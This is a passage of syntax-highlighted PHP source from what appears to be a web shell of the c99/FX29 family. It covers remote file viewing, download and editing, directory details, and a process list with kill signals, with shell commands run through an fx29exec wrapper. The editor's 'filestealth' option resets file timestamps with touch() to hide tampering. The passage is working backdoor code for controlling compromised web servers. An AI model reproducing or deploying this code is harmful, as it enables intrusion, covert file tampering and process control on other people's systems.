<span class="lineno">2198</span>         <span class="k">else</span> <span class="p">{</span> <span class="nb">highlight_file</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2199</span>         <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&lt;/div&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2200</span>       <span class="p">}</span>
<span class="lineno">2201</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;notepad&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2202</span>         <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
<span class="lineno">2203</span>         <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: text/plain&quot;</span><span class="p">);</span>
<span class="lineno">2204</span>         <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;.txt</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
<span class="lineno">2205</span>         <span class="k">echo</span><span class="p">(</span><span class="nv">$r</span><span class="p">);</span>
<span class="lineno">2206</span>         <span class="k">exit</span><span class="p">;</span>
<span class="lineno">2207</span>       <span class="p">}</span>
<span class="lineno">2208</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;download&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2209</span>         <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
<span class="lineno">2210</span>         <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: application/octet-stream&quot;</span><span class="p">);</span>
<span class="lineno">2211</span>         <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-length: &quot;</span><span class="o">.</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
<span class="lineno">2212</span>         <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
<span class="lineno">2213</span>         <span class="k">echo</span> <span class="nv">$r</span><span class="p">;</span>
<span class="lineno">2214</span>         <span class="k">exit</span><span class="p">;</span>
<span class="lineno">2215</span>       <span class="p">}</span>
<span class="lineno">2216</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;img&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2217</span>         <span class="nv">$inf</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno">2218</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$newwin</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2219</span>           <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$imgsize</span><span class="p">))</span> <span class="p">{</span><span class="nv">$imgsize</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;}</span>
<span class="lineno">2220</span>           <span class="nv">$width</span> <span class="o">=</span> <span class="nv">$inf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">/</span><span class="mi">100</span><span class="o">*</span><span class="nv">$imgsize</span><span class="p">;</span>
<span class="lineno">2221</span>           <span class="nv">$height</span> <span class="o">=</span> <span class="nv">$inf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">/</span><span class="mi">100</span><span class="o">*</span><span class="nv">$imgsize</span><span class="p">;</span>
<span class="lineno">2222</span>           <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;&lt;b&gt;Size:&lt;/b&gt; &quot;</span><span class="p">;</span>
<span class="lineno">2223</span>           <span class="nv">$sizes</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;100&quot;</span><span class="p">,</span><span class="s2">&quot;50&quot;</span><span class="p">,</span><span class="s2">&quot;20&quot;</span><span class="p">);</span>
<span class="lineno">2224</span>           <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sizes</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2225</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=img&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;imgsize=&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2226</span>             <span class="k">if</span> <span class="p">(</span><span class="nv">$imgsize</span> <span class="o">!=</span> <span class="nv">$v</span> <span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$v</span><span class="p">;}</span>
<span class="lineno">2227</span>             <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;u&gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&lt;/u&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">2228</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;/a&gt; &amp;nbsp; &quot;</span><span class="p">;</span>
<span class="lineno">2229</span>           <span class="p">}</span>
<span class="lineno">2230</span>           <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=img&amp;newwin=1&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> width=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$width</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$height</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/center&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2231</span>         <span class="p">}</span>
<span class="lineno">2232</span>         <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2233</span>           <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
<span class="lineno">2234</span>           <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
<span class="lineno">2235</span>           <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$ext</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$ext</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
<span class="lineno">2236</span>           <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: &quot;</span><span class="o">.</span><span class="nv">$inf</span><span class="p">[</span><span class="s2">&quot;mime&quot;</span><span class="p">]);</span>
<span class="lineno">2237</span>           <span class="nb">readfile</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno">2238</span>           <span class="k">exit</span><span class="p">;</span>
<span class="lineno">2239</span>         <span class="p">}</span>
<span class="lineno">2240</span>       <span class="p">}</span>
<span class="lineno">2241</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;edit&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2242</span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2243</span>          <span class="k">if</span> <span class="p">(</span><span class="nv">$filestealth</span><span class="p">)</span> <span class="p">{</span><span class="nv">$stat</span> <span class="o">=</span> <span class="nb">stat</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);}</span>
<span class="lineno">2244</span>          <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">2245</span>          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Can&#39;t write to file!&lt;/b&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">2246</span>          <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2247</span>            <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Saved!&lt;/b&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2248</span>            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$edit_text</span><span class="p">);</span>
<span class="lineno">2249</span>            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno">2250</span>            <span class="k">if</span> <span class="p">(</span><span class="nv">$filestealth</span><span class="p">)</span> <span class="p">{</span> <span class="nb">touch</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$stat</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span><span class="nv">$stat</span><span class="p">[</span><span class="mi">8</span><span class="p">]);</span> <span class="p">}</span>
<span class="lineno">2251</span>            <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$edit_text</span><span class="p">;</span>
<span class="lineno">2252</span>          <span class="p">}</span>
<span class="lineno">2253</span>        <span class="p">}</span>
<span class="lineno">2254</span>        <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">));</span>
<span class="lineno">2255</span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$rows</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2256</span>        <span class="k">elseif</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&gt;</span> <span class="mi">30</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$rows</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2257</span>        <span class="k">echo</span> <span class="s2">&quot;&lt;form name=</span><span class="se">\&quot;</span><span class="s2">f_save</span><span class="se">\&quot;</span><span class="s2"> action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=edit&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">2258</span>             <span class="s2">&quot;&lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Save</span><span class="se">\&quot;</span><span class="s2">&gt; &quot;</span><span class="o">.</span>
<span class="lineno">2259</span>             <span class="s2">&quot;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">reset</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Reset</span><span class="se">\&quot;</span><span class="s2">&gt; &quot;</span><span class="o">.</span>
<span class="lineno">2260</span>             <span class="s2">&quot;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">button</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">location.href=&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&#39;;</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Back</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br&gt;&quot;</span><span class="o">.</span>
<span class="lineno">2261</span>             <span class="s2">&quot;&lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">edit_text</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">125</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rows</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">2262</span>             <span class="s2">&quot;&lt;/form&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2263</span>       <span class="p">}</span>
<span class="lineno">2264</span>       <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ft</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2265</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;&lt;b&gt;Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of </span><span class="se">\$</span><span class="s2">GLOBALS.&lt;/b&gt;&lt;/center&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2266</span>       <span class="p">}</span>
<span class="lineno">2267</span>       <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2268</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;&lt;b&gt;Unknown file type (&quot;</span><span class="o">.</span><span class="nv">$ext</span><span class="o">.</span><span class="s2">&quot;), please select type manually.&lt;/b&gt;&lt;/center&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2269</span>       <span class="p">}</span>
<span class="lineno">2270</span>     <span class="p">}</span>
<span class="lineno">2271</span>     <span class="k">echo</span> <span class="s2">&quot;&lt;/div&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2272</span>   <span class="p">}</span>
<span class="lineno">2273</span>   <span class="c1">###[ DIRECTORY ]###</span>
<span class="lineno">2274</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2275</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;&lt;b&gt;</span><span class="si">$d</span><span class="s2"> is a not a Directory!&lt;/b&gt;&lt;/center&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2276</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2277</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Directory information:&lt;/b&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2278</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;table&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2279</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">2280</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td&gt; &quot;</span><span class="p">;</span>
<span class="lineno">2281</span>         <span class="nv">$ow</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
<span class="lineno">2282</span>         <span class="nv">$gr</span> <span class="o">=</span> <span class="nb">posix_getgrgid</span><span class="p">(</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
<span class="lineno">2283</span>         <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
<span class="lineno">2284</span>       <span class="p">}</span>
<span class="lineno">2285</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Perms&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=chmod&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;/a&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Create time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">filectime</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Access time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">fileatime</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MODIFY time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2286</span>     <span class="p">}</span>
<span class="lineno">2287</span>   <span class="p">}</span>
<span class="lineno">2288</span>   <span class="c1">###[ PROCESSES ]###</span>
<span class="lineno">2289</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;processes&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2290</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">2291</span> 
<span class="lineno">2292</span> 
<span class="lineno">2293</span> <span class="x">&lt;div class=&quot;barheader&quot;&gt;.: Processes :.&lt;/div&gt;</span>
<span class="lineno">2294</span> <span class="cp">&lt;?php</span>
<span class="lineno">2295</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span> <span class="nv">$handler</span> <span class="o">=</span> <span class="s2">&quot;ps aux&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$grep</span><span class="o">?</span><span class="s2">&quot; | grep &#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$grep</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2296</span>     <span class="k">else</span> <span class="p">{</span> <span class="nv">$handler</span> <span class="o">=</span> <span class="s2">&quot;tasklist&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2297</span>     <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">fx29exec</span><span class="p">(</span><span class="nv">$handler</span><span class="p">);</span>
<span class="lineno">2298</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Can&#39;t execute </span><span class="se">\&quot;</span><span class="si">$handler\</span><span class="s2">&quot;</span><span class="o">!</span><span class="s2">&quot;); }</span>
<span class="lineno">2299</span> <span class="s2">    else {</span>
<span class="lineno">2300</span> <span class="s2">      if (empty(</span><span class="si">$processes_sort</span><span class="s2">)) { </span><span class="si">$processes_sort</span><span class="s2"> = </span><span class="si">$sort_default</span><span class="s2">; }</span>
<span class="lineno">2301</span> <span class="s2">      </span><span class="si">$parsesort</span><span class="s2"> = parsesort(</span><span class="si">$processes_sort</span><span class="s2">);</span>
<span class="lineno">2302</span> <span class="s2">      if (!is_numeric(</span><span class="si">$parsesort[0]</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno">2303</span> <span class="s2">      </span><span class="si">$k</span><span class="s2"> = </span><span class="si">$parsesort[0]</span><span class="s2">;</span>
<span class="lineno">2304</span> <span class="s2">      if (</span><span class="si">$parsesort[1]</span><span class="s2"> != &quot;</span><span class="nx">a</span><span class="s2">&quot;) {</span>
<span class="lineno">2305</span> <span class="s2">        </span><span class="si">$y</span><span class="s2"> = &quot;</span> <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;a</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_desc</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Desc</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2306</span>       <span class="p">}</span>
<span class="lineno">2307</span>       <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2308</span>         <span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot; &lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;d</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_asc</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Asc</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2309</span>       <span class="p">}</span>
<span class="lineno">2310</span>       <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$ret</span><span class="p">);</span>
<span class="lineno">2311</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">2312</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2313</span>           <span class="k">if</span> <span class="p">(</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$sig</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sig</span> <span class="o">=</span> <span class="mi">9</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2314</span>           <span class="k">echo</span> <span class="s2">&quot;Sending signal &quot;</span><span class="o">.</span><span class="nv">$sig</span><span class="o">.</span><span class="s2">&quot; to #&quot;</span><span class="o">.</span><span class="nv">$pid</span><span class="o">.</span><span class="s2">&quot;... &quot;</span><span class="p">;</span>
<span class="lineno">2315</span>           <span class="k">if</span> <span class="p">(</span><span class="nb">posix_kill</span><span class="p">(</span><span class="nv">$pid</span><span class="p">,</span><span class="nv">$sig</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;OK!&lt;/b&gt;&quot;</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;ERROR!&lt;/b&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2316</span>         <span class="p">}</span>
<span class="lineno">2317</span>         <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2318</span>         <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
<span class="lineno">2319</span>         <span class="nv">$head</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno">2320</span>         <span class="nb">unset</span><span class="p">(</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno">2321</span>         <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2322</span>           <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span>
